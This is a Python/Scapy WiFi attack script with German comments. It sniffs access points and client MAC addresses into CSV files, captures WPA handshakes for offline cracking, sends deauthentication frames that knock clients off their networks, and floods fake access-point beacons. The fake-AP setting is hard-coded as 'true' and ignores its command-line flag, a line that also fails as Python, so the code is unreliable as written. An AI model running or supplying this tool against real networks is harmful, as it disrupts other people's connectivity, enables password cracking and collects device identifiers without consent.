#!/usr/bin/env python3
"""
Erweitertes WiFi-Scanning Script
- Robustes Monitor-Interface-Setup
- Sniffer mit PcapWriter (APs, Clients, Handshakes)
- Optional Deauth (--deauth --confirm)
- Optional Fake AP Flood (--fake-aps)
- Channel Hopper automatisch aktiv
- Auto-Loop Modus (--auto) für kontinuierliches Arbeiten
"""

import os
import sys
import argparse
import logging
from logging.handlers import RotatingFileHandler
import csv
import threading
import signal
import subprocess
import time
from datetime import datetime
from scapy.all import (
    sniff, Dot11, Dot11Elt, Dot11Beacon, Dot11ProbeResp, EAPOL,
    RadioTap, Dot11Deauth, Dot11ProbeReq, Dot11EltRates, sendp, wrpcap
)
from scapy.utils import PcapWriter

# ----------------------------
# CLI Argumente
# ----------------------------
parser = argparse.ArgumentParser(description="WiFi Sniffer + Deauth + FakeAP Flood")
parser.add_argument("--iface", "-i", default="mon0", help="Monitor interface (default mon0)")
parser.add_argument("--timeout", "-t", type=int, default=60, help="Scan timeout (default 60)")
parser.add_argument("--pcap", default="/home/pi/wifi_capture.pcap", help="Output PCAP file")
parser.add_argument("--handshakes", default="/home/pi/handshakes.pcap", help="Handshake PCAP file")
parser.add_argument("--csv-aps", default="/home/pi/wifi_aps.csv", help="CSV for APs")
parser.add_argument("--csv-clients", default="/home/pi/wifi_clients.csv", help="CSV for Clients")
parser.add_argument("--deauth", action="store_true", help="Enable deauth attack")
parser.add_argument("--confirm", action="store_true", help="Confirm deauth (safety)")
parser.add_argument("--fake-aps", action="store_true", help="Enable Fake AP Flood")
parser.add_argument("--auto", action="store_true", help="Enable continuous auto loop")
parser.add_argument("--debug", action="store_true", help="Debug logging to console")
parser.add_argument("--rotatelogs", action="store_true", help="Enable rotating log")
parser.add_argument("--logfile", default="/home/pi/wifi_edu.log", help="Logfile path")
args = parser.parse_args()

INTERFACE = args.iface
TIMEOUT = args.timeout
PCAP_FILE = args.pcap
PCAP_HANDSHAKES = args.handshakes
CSV_APS = args.csv_aps
CSV_CLIENTS = args.csv_clients
DO_DEAUTH = args.deauth
DO_CONFIRM = args.confirm
DO_FAKEAPS = true
AUTO_MODE = args.auto
DEBUG = args.debug

# ----------------------------
# Root check
# ----------------------------
if os.geteuid() != 0:
    print("Dieses Script benötigt Root-Rechte. Bitte mit sudo ausführen.")
    sys.exit(1)

# ----------------------------
# Logging Setup
# ----------------------------
logger = logging.getLogger("wifi_edu")
logger.setLevel(logging.DEBUG if DEBUG else logging.INFO)
fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
handler = RotatingFileHandler(args.logfile, maxBytes=5*1024*1024, backupCount=3) if args.rotatelogs else logging.FileHandler(args.logfile)
handler.setFormatter(fmt)
logger.addHandler(handler)
if DEBUG:
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(fmt)
    logger.addHandler(ch)

logger.info("Script gestartet (iface=%s, timeout=%s, deauth=%s, fakeaps=%s, auto=%s)",
            INTERFACE, TIMEOUT, DO_DEAUTH, DO_FAKEAPS, AUTO_MODE)

# ----------------------------
# Hilfsfunktionen
# ----------------------------
def is_valid_mac(mac):
    return isinstance(mac, str) and len(mac.split(":")) == 6

def is_local_random(mac):
    return mac.lower().startswith("02:") if mac else False

def init_csv(path, header):
    if not os.path.exists(path):
        with open(path, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(header)
        logger.info("CSV angelegt: %s", path)

init_csv(CSV_APS, ["Timestamp","SSID","BSSID","Channel","Capabilities"])
init_csv(CSV_CLIENTS, ["Timestamp","Client MAC","Type","Target/AP or Requested SSID"])

# ----------------------------
# Datenstrukturen
# ----------------------------
aps, clients = {}, {}
aps_lock, clients_lock = threading.Lock(), threading.Lock()
handshake_cache, handshake_packets = {}, {}
hs_lock = threading.Lock()

# ----------------------------
# Monitor-Interface Setup
# ----------------------------
try:
    if not os.path.exists(f"/sys/class/net/{INTERFACE}"):
        logger.info("Monitor-Interface %s nicht gefunden, versuche zu erstellen...", INTERFACE)
        try:
            phy = subprocess.check_output("iw dev wlan0 info | awk '/wiphy/ {print \"phy\"$2}'", shell=True, text=True).strip()
            if phy:
                subprocess.run(f"iw {phy} interface add {INTERFACE} type monitor", shell=True, check=False)
        except Exception as e:
            logger.warning("Fehler beim Interface-Setup: %s", e)
    subprocess.run(f"ip link set {INTERFACE} up", shell=True, check=False)
except Exception:
    logger.exception("Monitor-Interface Setup fehlgeschlagen")

if not os.path.exists(f"/sys/class/net/{INTERFACE}"):
    logger.error("Interface %s existiert nicht", INTERFACE)
    sys.exit(1)

# ----------------------------
# Channel Hopper
# ----------------------------
def channel_hopper(iface, stop_event, dwell=4.0):
    channels = [1, 6, 11]
    idx = 0
    logger.info("Channel Hopper gestartet")
    while not stop_event.is_set():
        ch = channels[idx % len(channels)]
        try:
            subprocess.run(f"iw dev {iface} set channel {ch}", shell=True, check=False)
            if DEBUG:
                logger.debug("CH %d gesetzt", ch)
        except Exception:
            pass
        idx += 1
        for _ in range(int(dwell * 10)):
            if stop_event.is_set():
                break
            time.sleep(0.1)

# ----------------------------
# PcapWriter
# ----------------------------
pcap_writer = PcapWriter(PCAP_FILE, append=True, sync=True)

# ----------------------------
# Packet Handler
# ----------------------------
def packet_handler(pkt):
    try: pcap_writer.write(pkt)
    except: pass
    if DEBUG: logger.debug(pkt.summary())

    # APs
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid, ssid = pkt.addr2, pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else "?"
        if bssid and ssid:
            try: channel = int(ord(pkt[Dot11Elt:3].info))
            except: channel = "?"
            with aps_lock:
                if bssid not in aps:
                    aps[bssid] = (ssid, channel)
                    logger.info("[AP] %s | %s | CH=%s", ssid, bssid, channel)
                    with open(CSV_APS, "a", newline="") as f:
                        csv.writer(f).writerow([datetime.now(), ssid, bssid, channel, ""])

    # Clients
    if pkt.haslayer(Dot11):
        client_mac = pkt.addr2
        if client_mac and not is_local_random(client_mac):
            if pkt.type == 0 and pkt.subtype == 4:  # Probe
                req_ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else ""
                with clients_lock:
                    if client_mac not in clients:
                        clients[client_mac] = ("Probe", req_ssid)
                        logger.info("[Client Probe] %s -> %s", client_mac, req_ssid)
                        with open(CSV_CLIENTS, "a", newline="") as f:
                            csv.writer(f).writerow([datetime.now(), client_mac, "Probe", req_ssid])
            elif pkt.type == 2:  # Data
                ap_mac = pkt.addr1
                with clients_lock:
                    if client_mac not in clients:
                        clients[client_mac] = ("Data", ap_mac)
                        logger.info("[Client Data] %s -> %s", client_mac, ap_mac)
                        with open(CSV_CLIENTS, "a", newline="") as f:
                            csv.writer(f).writerow([datetime.now(), client_mac, "Data", ap_mac])

    # Handshakes
    if pkt.haslayer(EAPOL):
        src, dst = pkt.addr2, pkt.addr1
        ap, client = (dst, src) if dst in aps else (src, dst)
        if ap and client:
            raw = bytes(pkt.getlayer(EAPOL))
            key, h = (ap, client), hash(raw)
            with hs_lock:
                handshake_cache.setdefault(key, set()).add(h)
                handshake_packets.setdefault(key, []).append(pkt)
                if len(handshake_cache[key]) >= 2:
                    wrpcap(PCAP_HANDSHAKES, handshake_packets[key], append=True)
                    logger.info("[HANDSHAKE] %s <-> %s gespeichert", ap, client)
                    handshake_cache[key].clear()
                    handshake_packets[key].clear()

# ----------------------------
# Fake AP Flood
# ----------------------------
def fake_ap_flood(stop_event):
    ssid_base = "FakeAP"
    counter = 0
    logger.info("Fake AP Flood gestartet")
    while not stop_event.is_set():
        ssid = f"{ssid_base}_{counter}"
        pkt = RadioTap()/Dot11(
            type=0, subtype=8,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=f"02:00:00:00:{counter>>8 & 0xff:02x}:{counter & 0xff:02x}",
            addr3=f"02:00:00:00:{counter>>8 & 0xff:02x}:{counter & 0xff:02x}"
        )/Dot11Beacon()/Dot11Elt(ID="SSID", info=ssid)/Dot11EltRates(rates=[130, 132, 11, 22])
        try:
            sendp(pkt, iface=INTERFACE, count=1, inter=0.01, verbose=0)
        except Exception: pass
        counter += 1

# ----------------------------
# Deauth
# ----------------------------
def perform_deauth(dry_run=True, confirm=False, count=5):
    with clients_lock:
        targets = [(ap, c) for c,(t,ap) in clients.items() if t=="Data" and ap in aps]
    for ap, client in targets:
        pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
        if dry_run or not confirm:
            logger.info("[DRY-RUN] Deauth %s -> %s", ap, client)
        else:
            sendp(pkt, iface=INTERFACE, count=count, inter=0.1, verbose=0)
            logger.info("[DEAUTH] %s -> %s", ap, client)

# ----------------------------
# Signal Handling
# ----------------------------
stop_event = threading.Event()
def handle_signal(signum, frame):
    stop_event.set()
    try: pcap_writer.close()
    except: pass
    sys.exit(0)
signal.signal(signal.SIGINT, handle_signal)
signal.signal(signal.SIGTERM, handle_signal)

# ----------------------------
# Main
# ----------------------------
def run_sniffer():
    sniff(iface=INTERFACE, prn=packet_handler, store=0, timeout=TIMEOUT)

# Channel Hopper starten
hopper_thread = threading.Thread(target=channel_hopper, args=(INTERFACE, stop_event), daemon=True)
hopper_thread.start()

# Fake AP Flood starten
if DO_FAKEAPS:
    threading.Thread(target=fake_ap_flood, args=(stop_event,), daemon=True).start()

# Sniffer starten
while True:
    sniff_thread = threading.Thread(target=run_sniffer, daemon=True)
    sniff_thread.start()
    sniff_thread.join()
    if DO_DEAUTH:
        perform_deauth(dry_run=not DO_CONFIRM, confirm=DO_CONFIRM)
    if not AUTO_MODE: break

logger.info("Beende Script")
